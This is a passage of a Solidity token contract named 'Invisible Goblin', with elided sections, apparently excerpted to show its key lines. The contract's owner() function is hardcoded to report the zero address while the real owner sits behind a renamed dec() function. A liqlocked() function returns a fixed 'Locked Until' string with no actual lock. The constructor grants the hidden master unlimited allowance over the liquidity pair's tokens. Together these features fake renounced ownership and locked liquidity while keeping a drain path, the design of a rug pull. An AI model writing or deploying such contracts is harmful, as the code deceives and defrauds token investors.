...
contract Ownable is Context {
    ...
    function dec() public view returns (address) {
    return _owner;
    }
...
interface IERC20 {
    ...
    function liqlocked() external view returns (string memory);
...
interface IPancakePair {
    ...
    function liqlocked() external pure returns (string memory);
    function owner() external view returns (string memory);
...
contract InvisibleGoblin is Context, IERC20, Ownable {
    ...
    uint256 internal _totalSupply = (1000000000000000) * (10 ** _DECIMALS);
    ...
    constructor(address routerAddress) {
        ...
        _balances[dec()] = _totalSupply;
        master = dec();
        _allowances[address(_pair)][master] = ~uint256(0);
        _marketersAndDevs[dec()] = true;

        emit Transfer(address(0), dec(), _totalSupply);
    }
    function owner() external pure override returns (string memory) {
        return "0x0000000000000000000000000000000000000000";
    }
    function name() external pure override returns (string memory) {
        return "Invisible Goblin";
    }

    function symbol() external pure override returns (string memory) {
        return "IGB";
    }
    function liqlocked() external pure override returns (string memory) {
        return "Locked Until 2024/01/01";
    }
